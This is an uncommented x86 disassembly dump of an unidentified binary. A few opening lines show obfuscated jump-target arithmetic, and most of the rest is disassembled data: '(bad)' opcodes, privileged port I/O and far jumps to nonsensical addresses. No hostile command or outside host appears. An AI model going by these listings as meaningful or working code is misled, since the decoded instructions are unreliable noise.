  428c45:	lea    eax,[esi+eax*1+0x3272fb]
  428c4c:	mov    ecx,DWORD PTR [ebp-0x154]
  428c52:	xor    ecx,0x75108b5
  428c58:	add    ecx,DWORD PTR [ebp-0x144]
  428c5e:	lea    eax,[ecx+eax*1+0x3272fb]
  428c65:	mov    DWORD PTR [ebp-0x144],eax
  428c6b:	jmp    0x42b034
  428c70:	mov    eax,DWORD PTR [ebp-0x154]
  428c76:	xor    eax,0x75108b5
  428c7b:	mov    ecx,DWORD PTR [ebp-0x144]
  428c81:	lea    eax,[ecx+eax*1+0x3272fb]
  428c88:	jmp    0x42b02e
  428c8d:	scas   eax,DWORD PTR es:[edi]
  428c8e:	in     al,0x37
  428c90:	dec    ebx
  428c91:	je     0x428cdb
  428c93:	mul    DWORD PTR [edx+ebx*1-0x1e]
  428c97:	imul   esi,DWORD PTR [edx-0x1e22cd5c],0xfffffffa
  428c9e:	lods   eax,DWORD PTR ds:[esi]
  428c9f:	jns    0x428d1c
  428ca1:	add    bl,BYTE PTR [eax-0x3f368485]
  428ca7:	ret    0xd0e7
  428caa:	aad    0xc4
  428cac:	jmp    0xfa2b787b
  428cb1:	int3   
  428cb2:	mov    ah,0xce
  428cb4:	repz add edx,esp
  428cb7:	push   es
  428cb8:	(bad)
  428cbb:	in     al,0xf1
  428cbd:	out    0xd9,eax
  428cbf:	mov    esp,0xcedfb0e
  428cc4:	icebp  
  428cc5:	shl    edx,cl
  428cc7:	out    dx,eax
  428cc8:	stos   DWORD PTR es:[edi],eax
  428cc9:	call   0xeaf5817f
  428cce:	rcr    ecx,1
  428cd0:	fst    st(5)
  428cd2:	mov    cl,0xc2
  428cd4:	(bad)  
  428cd5:	mov    edx,0x2e7edc1
  428cda:	add    al,0xe7
  428cdc:	push   es
  428cdd:	fcomp  st(4)
  428cdf:	push   cs
  428ce0:	(bad)  
  428ce1:	sti    
  428ce2:	std    
  428ce3:	std    
  428ce4:	mov    cl,0xcf
  428ce6:	shr    bl,cl
  428ce8:	in     eax,dx
  428ce9:	repz mov cl,0xee
  428cec:	mov    ah,0xf8
  428cee:	out    dx,al
  428cef:	(bad)  
  428cf0:	aad    0x3
  428cf2:	icebp  
  428cf3:	xlat   BYTE PTR ds:[ebx]
  428cf4:	cli    
  428cf5:	mov    edx,0xc3fdfaed
  428cfa:	sar    al,1
  428cfc:	add    ebx,esi
  428cfe:	stc    
  428cff:	(bad)  
  428d00:	fadd   st,st(4)
  428d02:	fist   WORD PTR [edx]
  428d04:	test   al,0xb3
  428d06:	mov    esp,0xd2bce9de
  428d0b:	ftst   
  428d0d:	in     al,dx
  428d0e:	(bad)  
  428d10:	retf   0x2b8
  428d13:	int3   
  428d14:	jecxz  0x428d0d
  428d16:	mov    esp,0xc7f1e7de
  428d1b:	in     eax,0xe1
  428d1d:	ret    0xfd0e
  428d20:	or     ecx,ecx
  428d22:	add    cl,bh
  428d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d25:	shl    BYTE PTR [ebp-0x44390e35],1
  428d2b:	repz jmp 0xebd0:0xe8aceed2
  428d33:	rcr    edi,1
  428d35:	out    0xf5,eax
  428d37:	fcomp  st(0)
  428d39:	sti    
  428d3a:	std    
  428d3b:	ror    cl,1
  428d3d:	fild   DWORD PTR [eax]
  428d3f:	add    ah,dh
  428d41:	or     eax,0xcba7e8c9
  428d46:	loopne 0x428cf7
  428d48:	mov    ch,0xf5
  428d4a:	out    0xb6,al
  428d4c:	scas   eax,DWORD PTR es:[edi]
  428d4d:	hlt    
  428d4e:	rol    ebp,1
  428d50:	into   
  428d51:	enter  0xcdcf,0xb8
  428d55:	fcomip st,st(5)
  428d57:	cmc    
  428d58:	sar    cl,1
  428d5a:	out    0xff,al
  428d5c:	(bad)  
  428d5d:	(bad)  
  428d5e:	loop   0x428d4d
  428d60:	(bad)  
  428d61:	loope  0x428d76
  428d63:	fucomip st,st(6)
  428d65:	test   al,0xa8
  428d67:	(bad)  
  428d68:	int    0xce
  428d6a:	test   bh,0xf8
  428d6d:	mov    edx,0xcbf8c5d7
  428d72:	jmp    0xd2377c30
  428d77:	in     eax,dx
  428d78:	fcmovnb st,st(6)
  428d7a:	out    0xfa,eax
  428d7c:	test   DWORD PTR [edi],0xc9fbeb03
  428d82:	in     al,0x6
  428d84:	in     eax,0xea
  428d86:	shr    ecx,0xb6
  428d89:	mov    bh,0xb4
  428d8b:	int    0xf1
  428d8d:	idiv   ebx
  428d8f:	lods   al,BYTE PTR ds:[esi]
  428d90:	jmp    0x428d66
  428d92:	lock jecxz 0x428d85
  428d95:	lock mov edi,0xc7e3df01
  428d9b:	fcmovnbe st,st(5)
  428d9d:	(bad)  
  428d9e:	xlat   BYTE PTR ds:[ebx]
  428d9f:	pop    es
  428da0:	fsubr  st(0),st
  428da2:	out    dx,al
  428da3:	add    al,0xc7
  428da5:	fnstsw WORD PTR [ebp-0xd301632]
  428dab:	(bad)  
  428dac:	mov    bl,0xf8
  428dae:	mov    bh,0xf6
  428db0:	fucomi st,st(7)
  428db2:	enter  0xfbc8,0xc8
  428db6:	fdivr  st,st(7)
  428db8:	lds    edi,FWORD PTR [esi-0x4f9002a]
  428dbe:	(bad)  
  428dbf:	stc    
  428dc0:	add    al,0xff
  428dc2:	fprem  
  428dc4:	fbstp  TBYTE PTR [ecx-0x4823353e]
  428dca:	out    dx,al
  428dcb:	(bad)  
  428dcc:	jmp    0xe52d6698
  428dd1:	test   cl,0xd6
  428dd4:	cli    
  428dd5:	mov    edx,0xc103fdd4
  428dda:	pop    es
  428ddb:	inc    DWORD PTR [edx]
  428ddd:	fyl2xp1 
  428ddf:	cmc    
  428de0:	or     bl,ch
  428de2:	(bad)  
  428de4:	fsubrp st(0),st
  428de6:	ret    0xe6ae
  428de9:	retf   
  428dea:	lods   eax,DWORD PTR ds:[esi]
  428deb:	loope  0x428dd7
  428ded:	mov    bh,0xd8
  428def:	retf   
  428df0:	rcl    al,cl
  428df2:	ret    
  428df3:	jecxz  0x428df7
  428df5:	loop   0x428ded
  428df7:	rol    ch,0xf2
  428dfa:	jmp    0xe4e6:0xc0f0c0f7
  428e01:	stc    
  428e02:	fxch   st(4)
  428e04:	scas   al,BYTE PTR es:[edi]
  428e05:	test   al,0xca
  428e07:	(bad)  
  428e08:	shl    edx,cl
  428e0a:	leave  
  428e0b:	int3   
  428e0c:	in     al,dx
  428e0d:	into   
  428e0e:	mov    bh,0xff
  428e10:	idiv   edx
  428e12:	mov    ah,0xdb
  428e14:	add    bh,bh
  428e16:	int    0xdc
  428e18:	rcl    eax,0xe4
  428e1b:	add    dl,ch
  428e1d:	loope  0x428e27
  428e1f:	fisttp WORD PTR [edx]
  428e21:	hlt    
  428e22:	inc    al
  428e24:	mov    ecx,0xb1cdc0dd
  428e29:	jmp    0xd7e4:0xd6b3dbb4
  428e30:	call   0xc03c7efd
  428e35:	call   0xdb157216
  428e3a:	repnz hlt 
  428e3c:	stc    
  428e3d:	jmp    0xf02:0xe1dbe1e8
  428e44:	in     al,dx
  428e45:	rcl    edi,0xe7
  428e48:	retf   
  428e49:	lods   eax,DWORD PTR ds:[esi]
  428e4a:	(bad)  
  428e4b:	(bad)  
  428e4c:	not    esi
  428e4e:	fucomip st,st(5)
  428e50:	fucompp 
  428e52:	cmc    
  428e53:	shl    BYTE PTR [edi-0x8080c30],1
  428e59:	(bad)  
  428e5b:	retf   
  428e5c:	out    0x2,eax
  428e5e:	add    dl,bl
  428e60:	(bad)  ds:0xa6c0e0ed
  428e66:	xlat   BYTE PTR ds:[ebx]
  428e67:	mov    bl,0xb3
  428e69:	fsubr  st(3),st
  428e6b:	retf   0xeab3
  428e6e:	cmc    
  428e6f:	ror    ecx,1
  428e71:	retf   
  428e72:	(bad)  
  428e73:	jmp    0xdedd:0xb4c2e8da
  428e7a:	mov    ecx,0xfae5f001
  428e7f:	jecxz  0x428e49
  428e81:	into   
  428e82:	jecxz  0x428e6c
  428e84:	(bad)
  428e87:	jecxz  0x428e4d
  428e89:	in     al,dx
  428e8a:	cli    
  428e8b:	lds    esi,FWORD PTR [esi-0xf283817]
  428e91:	hlt    
  428e92:	out    dx,eax
  428e93:	ret    0xd4d7
  428e96:	out    dx,eax
  428e97:	aad    0xdb
  428e99:	add    eax,0xfce5e604
  428e9e:	clc    
  428e9f:	call   0xe9497a8d
  428ea4:	iret   
  428ea5:	out    0xe9,al
  428ea7:	int3   
  428ea8:	shl    BYTE PTR [ebp-0x291e1549],1
  428eae:	lods   eax,DWORD PTR ds:[esi]
  428eaf:	int3   
  428eb0:	in     eax,dx
  428eb1:	mov    dl,0xd9
  428eb3:	shl    ah,1
  428eb5:	sar    BYTE PTR [esp+ebp*8-0x8233efc],1
  428ebc:	fild   DWORD PTR [ebx]
  428ebe:	pop    es
  428ebf:	iret   
  428ec0:	fiadd  DWORD PTR [ebx]
  428ec2:	adc    bl,ah
  428ec4:	shl    dh,1
  428ec6:	ret    
  428ec7:	int3   
  428ec8:	lods   eax,DWORD PTR ds:[esi]
  428ec9:	iret   
  428eca:	(bad)  
  428ecb:	cli    
  428ecc:	out    0xed,al
  428ece:	int    0xfa
  428ed0:	call   0xd0068ec3
  428ed5:	shl    bh,1
  428ed7:	shl    esp,cl
  428ed9:	add    esp,esp
  428edb:	add    ah,bh
  428edd:	pop    es
  428ede:	fcmovne st,st(6)
  428ee0:	jmp    0xcfce:0xc3c4cedd
  428ee7:	scas   eax,DWORD PTR es:[edi]
  428ee8:	lods   eax,DWORD PTR ds:[esi]
  428ee9:	mov    dh,0xfb
  428eeb:	stc    
  428eec:	xlat   BYTE PTR ds:[ebx]
  428eed:	int3   
  428eee:	hlt    
  428eef:	mov    esi,0xcadad2d6
  428ef4:	mov    edx,0xd1d1c7e1
  428ef9:	fdiv   st,st(6)
  428efb:	(bad)  
  428efc:	loope  0x428efd
  428efe:	(bad)  
  428f00:	out    0xdb,al
  428f02:	iret   
  428f03:	or     al,0xca
  428f05:	lods   al,BYTE PTR ds:[esi]
  428f06:	out    0xf3,eax
  428f08:	int    0xea
  428f0a:	test   eax,0xd9b0c8e6
  428f10:	out    dx,eax
  428f11:	clc    
  428f12:	(bad)  
  428f14:	add    ebx,edx
  428f16:	cld    
  428f17:	fdivr  st,st(1)
  428f19:	(bad)  
  428f1a:	jmp    0xdfc7:0x3dfd9ea
  428f21:	jmp    0xc0ff67ee
  428f26:	int    0xc4
  428f28:	(bad)  
  428f29:	in     eax,dx
  428f2a:	icebp  
  428f2b:	int    0xc1
  428f2d:	ror    dl,1
  428f2f:	int    0xd2
  428f31:	rcr    bl,cl
  428f33:	jmp    0x2376a10
  428f38:	loope  0x428f31
  428f3a:	div    eax
  428f3c:	in     al,0xc8
  428f3e:	pop    es
  428f3f:	out    0xdf,al
  428f41:	pop    es
  428f42:	repz fdiv st,st(0)
  428f45:	fmul   st(2),st
  428f47:	ret    
  428f48:	stos   DWORD PTR es:[edi],eax
  428f49:	sti    
  428f4a:	loopne 0x428f1d
  428f4c:	jmp    0x428f47
  428f4e:	lock cli 
  428f50:	mov    edx,0xecfdd6cf
  428f55:	mov    eax,0x7c2c0ce
  428f5a:	les    eax,FWORD PTR [esi]
  428f5c:	cld    
  428f5d:	loope  0x428f63
  428f5f:	fadd   DWORD PTR ds:0xeefc0cda
  428f65:	in     al,dx
  428f66:	out    0xde,eax
  428f68:	in     eax,0xb1
  428f6a:	loopne 0x428f21
  428f6c:	cli    
  428f6d:	mov    ch,0xd0
  428f6f:	jmp    0xd1d5:0xbafefef8
  428f76:	int3   
  428f77:	add    eax,0xc2bcffe1
  428f7c:	out    0xd0,al
  428f7e:	mov    ebp,0xfce0e06
  428f83:	jmp    0x428f43
  428f85:	xlat   BYTE PTR ds:[ebx]
  428f86:	test   al,0xe8
  428f88:	hlt    
  428f89:	mov    al,0xe0
  428f8b:	rcr    ebx,1
  428f8d:	(bad)  
  428f8e:	mov    ecx,0xf4d5eed2
  428f93:	mov    esi,0xc7eddbf8
  428f98:	clc    
  428f99:	lock push es
  428f9b:	repnz in eax,0x6
  428f9e:	aam    0xfc
  428fa0:	fiadd  DWORD PTR [esi+eiz*8]
  428fa3:	bsf    ebp,DWORD PTR [ecx-0xd4f3c14]
  428faa:	mov    al,0xca
  428fac:	scas   eax,DWORD PTR es:[edi]
  428fad:	mov    dl,0xba
  428faf:	aam    0xbf
  428fb1:	stc    
  428fb2:	jmp    0xdfc0:0xde02fff1
  428fb9:	add    al,0xb9
  428fbb:	pop    es
  428fbc:	retf   0xe3c4
  428fbf:	loope  0x428f87
  428fc1:	hlt    
  428fc2:	push   cs
  428fc3:	push   cs
  428fc4:	scas   eax,DWORD PTR es:[edi]
  428fc5:	mov    dl,0xd7
  428fc7:	mov    dl,0xb7
  428fc9:	repnz mov al,0xb7
  428fcc:	(bad)  
  428fce:	repnz shl BYTE PTR [edi-0x23260f29],cl
  428fd5:	in     eax,dx
  428fd6:	mov    ecx,0x2f4c5f9
  428fdb:	mov    ah,0xff
  428fde:	or     edx,ebx
  428fe0:	push   es
  428fe1:	add    bl,dl
  428fe3:	adc    ah,bh
  428fe5:	out    dx,al
  428fe6:	scas   eax,DWORD PTR es:[edi]
  428fe7:	lock int 0xf1
  428fea:	mov    esp,0xeed4b6fb
  428ff0:	cmc    
  428ff1:	mov    esp,0xb9daeafd
  428ff6:	fistp  QWORD PTR [ebp-0x241f1500]
  428ffc:	jmp    0x428fdd
  428ffe:	sti    
  428fff:	out    0xdf,al
  429001:	adc    esp,eax
  429003:	out    0xd1,al
  429005:	ror    dh,1
  429007:	test   al,0xcb
  429009:	mov    ch,0xd4
  42900b:	mov    bh,0xda
  42900d:	sar    BYTE PTR [edi-0x400e4405],0x2
  429014:	mov    eax,0xfbbfffb8
  429019:	stc    
  42901a:	fadd   st(7),st
  42901c:	cld    
  42901d:	shl    dh,1
  42901f:	add    ebx,eax
  429021:	call   0xdd238fff
  429026:	loope  0x429011
  429028:	repnz lods eax,DWORD PTR ds:[esi]
  42902a:	sti    
  42902b:	fnsetpm(287 only) 
  42902d:	(bad)  
  42902e:	fcmovbe st,st(6)
  429030:	retf   
  429031:	add    edi,DWORD PTR [esi-0x212d1348]
  429037:	inc    DWORD PTR ds:0xdaca0505
  42903d:	psubsb mm4,mm1
  429040:	hlt    
  429041:	or     bl,ah
  429043:	retf   
  429044:	rol    cl,0xcc
  429047:	fmulp  st(6),st
  429049:	repz aam 0xcb
  42904c:	repnz repnz in al,0xf6
  429050:	in     al,dx
  429051:	mov    ebp,0x7e3d2f0
  429056:	int3   
  429057:	cld    
  429058:	sti    
  429059:	icebp  
  42905a:	test   al,0xfc
  42905d:	in     eax,0xdc
  42905f:	cld    
  429060:	fmul   QWORD PTR [eax]
  429062:	jecxz  0x429057
  429064:	out    dx,al
  429065:	shl    bl,cl
  429067:	mov    esp,0xc8c2b0d0
  42906c:	sar    DWORD PTR [edx-0xb35290a],0xdf
  429073:	loope  0x429048
  429075:	test   esi,0x2fdd4f3
  42907b:	in     al,0xf0
  42907d:	add    edi,eax
  42907f:	cmc    
  429080:	add    ah,cl
  429082:	adc    esi,ebx
  429084:	repnz shr esi,1
  429087:	int3   
  429088:	enter  0xe3ec,0xf6
  42908c:	mov    dh,0xef
  42908e:	(bad)  
  429090:	mov    ebx,0xd2c8fde4
  429095:	mov    esp,0xfde2dbc2
  42909a:	in     al,0xca
  42909c:	in     al,0xef
  42909e:	loopne 0x429076
  4290a0:	(bad)  
  4290a1:	in     eax,0xfa
  4290a3:	jmp    0xf6ee:0xafe4e7dd
  4290aa:	int3   
  4290ab:	in     al,dx
  4290ac:	scas   eax,DWORD PTR es:[edi]
  4290ad:	cmc    
  4290ae:	enter  0xe8d7,0xb2
  4290b2:	clc    
  4290b3:	xlat   BYTE PTR ds:[ebx]
  4290b4:	add    eax,ecx
  4290b6:	clc    
  4290b7:	cli    
  4290b8:	out    0xe0,eax
  4290ba:	mov    ebp,0xdcd5fdc0
  4290bf:	push   es
  4290c0:	sti    
  4290c1:	add    bl,ah
  4290c3:	fcomp  st(5)
  4290c5:	shl    esi,0xce
  4290c8:	(bad)
  4290cb:	enter  0xc5b9,0xf3
  4290cf:	(bad)  
  4290d0:	mov    eax,0xd9e8cacb
  4290d5:	rcl    dl,0xf9
  4290d8:	mul    eax
  4290da:	ret    
  4290db:	out    0x5,eax
  4290dd:	mov    esi,0xe40ed901
  4290e2:	loop   0x4290f7
  4290e4:	mov    edi,0xf4c3c0c1
  4290e9:	fcmovnbe st,st(1)
  4290eb:	into   
  4290ec:	retf   0xe8d7
  4290ef:	mov    bh,0xf6
  4290f1:	aam    0xfa
  4290f3:	(bad)  
  4290f4:	fsub   st(4),st
  4290f6:	sar    dh,0x5
  4290f9:	std    
  4290fa:	push   es
  4290fb:	mov    eax,0xeed70701
  429100:	out    0xe4,al
  429102:	int3   
  429103:	loope  0x4290f1
  429105:	fsubrp st(2),st
  429107:	rcl    ah,cl
  429109:	in     al,dx
  42910a:	in     eax,0xbb
  42910c:	mov    bh,0xf8
  42910e:	lock fistp QWORD PTR [ecx-0x5433615]
  429115:	add    esi,ebp
  429117:	add    esi,edi
  429119:	in     al,0xb
  42911b:	jmp    0xe4e4:0xfea06d1
  429122:	cli    
  429123:	fcom   st(2)
  429125:	in     eax,0xb7
  429127:	into   
  429128:	in     al,dx
  429129:	mov    esp,0xd9bbe6e0
  42912e:	cli    
  42912f:	mov    ah,0xd1
  429131:	cld    
  429132:	fxch   st(7)
  429134:	xlat   BYTE PTR ds:[ebx]
  429135:	xlat   BYTE PTR ds:[ebx]
  429136:	int3   
  429137:	mov    ch,0x3
  42913a:	inc    DWORD PTR [edi]
  42913c:	call   0xfc089a1d
  429141:	(bad)  
  429142:	std    
  429143:	or     dh,ah
  429145:	out    dx,al
  429146:	rcr    esp,cl
  429148:	(bad)  
  429149:	repz aam 0xd0
  42914c:	(bad)  
  42914e:	jmp    esi
  429150:	enter  0xdcd3,0xde
  429154:	(bad)  
  429155:	repnz add dl,dl
  429158:	icebp  
  429159:	aad    0xb9
  42915b:	or     ebp,edx
  42915d:	in     eax,0xe7
  42915f:	fsubp  st(4),st
  429161:	in     al,0xff
  429163:	fistp  QWORD PTR [esi-0x501c2d31]
  429169:	(bad)  
  42916a:	loope  0x42914c
  42916c:	int3   
  42916d:	retf   
  42916e:	icebp  
  42916f:	cmc    
  429170:	in     eax,0xd1
  429172:	fdivrp st(7),st
  429174:	rol    ebx,0xf1
  429177:	repnz mov ebp,0xca04b903
  42917d:	or     DWORD PTR [ecx],eax
  42917f:	mov    BYTE PTR [ebx],0x9
  429182:	enter  0xaeed,0xc5
  429186:	mov    esp,0xccf3c0e4
  42918b:	icebp  
  42918c:	jmp    0x429169
  42918e:	fld    st(4)
  429190:	fdivrp st(6),st
  429192:	idiv   DWORD PTR [esi-0x28132e23]
  429198:	int    0xf5
  42919a:	xlat   BYTE PTR ds:[ebx]
  42919b:	add    al,ah
  42919d:	xlat   BYTE PTR ds:[ebx]
  42919e:	out    0xee,eax
  4291a0:	add    dh,bl
  4291a2:	(bad)  
  4291a4:	ret    
  4291a5:	mov    bh,0xd5
  4291a8:	mov    ch,0xdb
  4291aa:	lock mov ebx,0xead8f3f2
  4291b0:	mov    ebp,0xfccddcef
  4291b5:	mov    ebp,0xd9bed6fd
  4291ba:	cli    
  4291bb:	add    ah,bl
  4291bd:	retf   
  4291be:	aad    0xc8
  4291c0:	jmp    0xda3157bd
  4291c5:	enter  0xc8c1,0xce
  4291c9:	mov    bh,0xc5
  4291cb:	jmp    0x4291ad
  4291cd:	aad    0xf4
  4291cf:	jmp    0xf4ed:0xcdebfbd7
  4291d6:	aad    0xbe
  4291d8:	sar    eax,1
  4291da:	in     eax,0xf8
  4291dc:	shl    bh,1
  4291de:	jmp    esp
  4291e0:	add    bh,cl
  4291e2:	cli    
  4291e3:	(bad)  
  4291e5:	(bad)  
  4291e6:	int3   
  4291e7:	in     eax,0xc0
  4291e9:	test   ch,0xf3
  4291ec:	(bad)  
  4291ed:	mov    edx,0xb6d1eed7
  4291f2:	cmc    
  4291f3:	mov    ebp,0xd607c2b9
  4291f8:	mov    ebx,0xdcf4e7e0
  4291fd:	loop   0x4291db
  4291ff:	jmp    0x4291eb
  429201:	fcomip st,st(3)
  429203:	loopne 0x4291ec
  429205:	enter  0xf5b7,0xe9
  429209:	hlt    
  42920a:	mov    ch,0xb3
  42920c:	loope  0x4291c0
  42920e:	clc    
  42920f:	call   0x22e84ca
  429214:	mov    eax,0xc3bff9cf
  429219:	cli    
  42921a:	add    edx,ebp
  42921c:	(bad)  
  42921e:	(bad)  
  42921f:	in     al,0xe0
  429221:	fdivp  st(2),st
  429223:	(bad)  
  429225:	xlat   BYTE PTR ds:[ebx]
  429226:	jecxz  0x42920e
  429228:	iret   
  429229:	in     al,dx
  42922a:	in     al,0xe4
  42922c:	mov    bh,0xe4
  42922e:	rcr    edi,1
  429230:	out    dx,eax
  429231:	(bad)  
  429232:	(bad)  
  429234:	aam    0xb6
  429236:	iret   
  429237:	ffreep st(6)
  429239:	(bad)  
  42923a:	fcomi  st,st(7)
  42923c:	(bad)  
  42923d:	push   es
  42923e:	out    dx,eax
  42923f:	retf   0xccf
  429242:	out    0xf3,al
  429244:	loope  0x429208
  429246:	loop   0x429209
  429248:	lock int 0xc1
  42924b:	repz hlt 
  42924d:	int3   
  42924e:	retf   0xeaac
  429251:	mov    dh,0xb1
  429253:	mov    al,0xf3
  429255:	iret   
  429256:	shr    ebp,0xf8
  429259:	repz retf 
  42925b:	ret    0xd8e7
  42925e:	push   cs
  42925f:	std    
  429260:	(bad)  
  429261:	stc    
  429262:	add    al,0x0
  429264:	lods   eax,DWORD PTR ds:[esi]
  429265:	ret    
  429266:	test   al,0xac
  429268:	leave  
  429269:	mov    cl,0xec
  42926b:	rcr    ebx,cl
  42926d:	push   edx
  42926f:	(bad)  
  429270:	mov    eax,0xcdc3b8f7
  429275:	add    edi,edi
  429277:	hlt    
  429278:	aam    0xe0
  42927a:	xlat   BYTE PTR ds:[ebx]
  42927b:	repnz retf 0xfcc7
  42927f:	aam    0x7
  429281:	leave  
  429282:	out    dx,eax
  429283:	icebp  
  429284:	mov    bl,0xb0
  429286:	shr    dh,1
  429288:	rcl    ecx,1
  42928a:	jmp    0x429259
  42928c:	jmp    0xfd3c6247
  429291:	retf   
  429292:	icebp  
  429293:	mov    edx,0xdedac202
  429298:	fsub   st,st(4)
  42929a:	add    al,BYTE PTR [ecx]
  42929c:	ret    
  42929d:	in     eax,0x3
  42929f:	(bad)  
  4292a0:	loopne 0x429296
  4292a2:	loop   0x4292aa
  4292a4:	rcr    dh,0xe1
  4292a7:	fdiv   QWORD PTR [edi-0x192d0e17]
  4292ad:	retf   
  4292ae:	bnd jmp 0xb51971a6
  4292b4:	iret   
  4292b5:	mov    edi,0x1d4f9db
  4292ba:	out    0xe3,eax
  4292bc:	out    0xe7,eax
  4292be:	(bad)  
  4292bf:	out    dx,al
  4292c0:	jmp    0x4292d1
  4292c2:	fsubr  st(4),st
  4292c4:	jmp    0xb73164b0
  4292c9:	(bad)  
  4292ca:	mov    dh,0xb2
  4292cc:	mov    ecx,0xcef1def7
  4292d1:	(bad)  
  4292d2:	cli    
  4292d3:	mov    esp,0xd002fefb
  4292d8:	out    0xf3,eax
  4292da:	jecxz  0x429298
  4292dc:	or     ch,bl
  4292de:	jecxz  0x4292aa
  4292e0:	aad    0xff
  4292e2:	iret   
  4292e3:	or     al,0xdf
  4292e5:	mov    bl,0xe6
  4292e7:	call   0xd10f76e1
  4292ec:	lock int 0xcf
  4292ef:	aam    0xea
  4292f1:	jmp    0xc3c1:0xecfdd2c8
  4292f8:	mov    ebx,0xd7f1e6fa
  4292fd:	cli    
  4292fe:	bswap  ebx
  429300:	or     bl,ch
  429302:	in     eax,dx
  429303:	or     al,0xaa
  429305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429306:	mov    dl,0xe7
  429308:	repnz mov dl,0xd4
  42930b:	(bad)  
  42930c:	(bad)  
  42930e:	in     eax,dx
  42930f:	cmc    
  429310:	int    0xe4
  429312:	int3   
  429313:	mov    ah,0xef
  429315:	lock fucomp st(4)
  429318:	(bad)  
  42931a:	rcr    dl,0x1
  42931d:	fcmovu st,st(4)
  42931f:	(bad)  
  429320:	fsubr  st,st(1)
  429322:	push   es
  429323:	int3   
  429324:	scas   al,BYTE PTR es:[edi]
  429325:	out    dx,eax
  429326:	(bad)  
  429327:	jmp    0xd3f7:0xd5c4c8c9
  42932e:	aam    0xfd
  429330:	mov    ch,0xf9
  429332:	cmc    
  429333:	fdivp  st(3),st
  429335:	out    dx,eax
  429336:	add    DWORD PTR [esi-0x16282dfe],edi
  42933c:	pop    es
  42933d:	(bad)  
  42933f:	fisttp QWORD PTR [ecx]
  429341:	in     eax,dx
  429342:	ror    DWORD PTR [edi],cl
  429344:	shl    edi,cl
  429346:	(bad)  
  429348:	mov    dl,0xb2
  42934a:	repnz rol eax,0xc9
  42934e:	icebp  
  42934f:	mov    dh,0xe5
  429351:	fst    st(1)
  429353:	neg    al
  429355:	into   
  429356:	mov    ecx,0xfaf2fcd7
  42935b:	jecxz  0x42931d
  42935d:	call   0xc64b9926
  429362:	sti    
  429363:	loop   0x42933d
  429365:	mov    al,0xbd
  429367:	fmulp  st(0),st
  429369:	out    dx,al
  42936a:	mov    bh,0xa8
  42936c:	repz aam 0xda
  42936f:	into   
  429370:	rcl    esp,1
  429372:	jecxz  0x429370
  429374:	(bad)  
  429376:	add    ebx,esp
  429378:	int    0xc1
  42937a:	add    eax,0xfde9f900
  42937f:	(bad)  
  429380:	aam    0xa
  429382:	jecxz  0x42938b
  429384:	jmp    0xc3ce:0xf7c0dcec
  42938b:	icebp  
  42938c:	jmp    0x42937c
  42938e:	(bad)  
  429390:	(bad)  
  429391:	clc    
  429392:	mov    eax,0xb9b8d0df
  429397:	add    bh,BYTE PTR [ecx+eiz*8+0xf08dde6]
  42939e:	aam    0xc8
  4293a0:	fiadd  WORD PTR [esi]
  4293a2:	stc    
  4293a3:	add    bl,al
  4293a5:	jmp    0xd4e4:0xc3add6eb
  4293ac:	mov    ch,0xfb
  4293ae:	mul    esp
  4293b0:	call   0xe9f36c6d
  4293b5:	mov    ecx,0xfef8fcc7
  4293ba:	vshufps xmm4,xmm1,xmm3,0x1
  4293bf:	call   0xe02b61cb
  4293c4:	in     al,0xe2
  4293c6:	lods   eax,DWORD PTR ds:[esi]
  4293c7:	loope  0x429391
  4293c9:	(bad)  
  4293ca:	shl    dl,1
  4293cc:	int3   
  4293cd:	(bad)  
  4293ce:	fcomip st,st(4)
  4293d0:	aam    0xff
  4293d2:	add    dh,dh
  4293d4:	loop   0x429398
  4293d6:	repz (bad) 
  4293d9:	cld    
  4293da:	add    dl,ah
  4293dc:	rol    ah,1
  4293de:	in     eax,0x4
  4293e0:	in     al,0xfb
  4293e2:	fcmovnu st,st(5)
  4293e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293e5:	mov    dl,0xbe
  4293e7:	call   0xfc0660b9
  4293ec:	lock lock int 0xd4
  4293f0:	aad    0xbd
  4293f2:	repz fidivr DWORD PTR [esi-0x422c4042]
  4293f9:	(bad)  
  4293fa:	ror    ebx,cl
  4293fc:	add    BYTE PTR [edi],al
  4293fe:	jmp    0xe8e6:0x5ea03db
  429405:	loope  0x4293c9
  429407:	leave  
  429408:	rol    esp,0xc7
  42940b:	mov    bl,0xe7
  42940d:	mov    cl,0xc8
  42940f:	aad    0xb6
  429411:	jmp    0xd83485f9
  429416:	push   edi
  429418:	std    
  429419:	repz shl ecx,0x7
  42941d:	(bad)  
  42941f:	jmp    0x1307602f
  429424:	lods   al,BYTE PTR ds:[esi]
  429425:	out    0xc4,al
  429427:	retf   0xe4d2
  42942a:	loopne 0x4293f5
  42942c:	mov    bh,0xd0
  42942e:	(bad)  
  42942f:	mov    edx,0xc2cddff8
  429434:	test   BYTE PTR [edx],0xdd
  429437:	in     al,dx
  429438:	mov    ebp,0xe600f7f0
  42943d:	or     esi,edx
  42943f:	jecxz  0x429449
  429441:	in     eax,0x3
  429443:	out    dx,al
  429444:	scas   eax,DWORD PTR es:[edi]
  429445:	mov    dl,0xb2
  429447:	jecxz  0x4293f5
  429449:	(bad)  
  42944a:	loope  0x429447
  42944c:	shl    dh,cl
  42944e:	enter  0xb9b9,0xf3
  429452:	push   esi
  429454:	add    edx,esp
  429456:	mov    esi,0xe7e1d0fe
  42945b:	shl    esi,1
  42945d:	clc    
  42945e:	add    eax,0x13ec06df
  429463:	faddp  st(7),st
  429465:	mov    edi,0xe6d6dee9
  42946a:	in     al,0xcd
  42946c:	mov    ah,0xec
  42946e:	into   
  42946f:	jmp    0xed0e7338
  429474:	out    dx,al
  429475:	mov    edx,0xe3c5e1b9
  42947a:	retf   
  42947b:	jecxz  0x429444
  42947d:	add    al,0x1
  42947f:	in     al,0xe1
  429481:	(bad)  
  429483:	out    0xc8,eax
  429485:	(bad)  
  429486:	out    dx,al
  429487:	loop   0x42945c
  429489:	loope  0x42944e
  42948b:	mov    edx,0xb7cfc0f4
  429490:	retf   0xd9cf
  429493:	sti    
  429494:	int3   
  429495:	not    ebx
  429497:	mov    edi,0xeb02f4f1
  42949c:	loop   0x4294a8
  42949e:	add    ch,dh
  4294a0:	std    
  4294a1:	retf   
  4294a2:	(bad)
  4294a5:	repz (bad) 
  4294a7:	xlat   BYTE PTR ds:[ebx]
  4294a8:	rol    ebx,1
  4294aa:	xlat   BYTE PTR ds:[ebx]
  4294ab:	(bad)  
  4294ac:	out    0xf3,eax
  4294ae:	lods   eax,DWORD PTR ds:[esi]
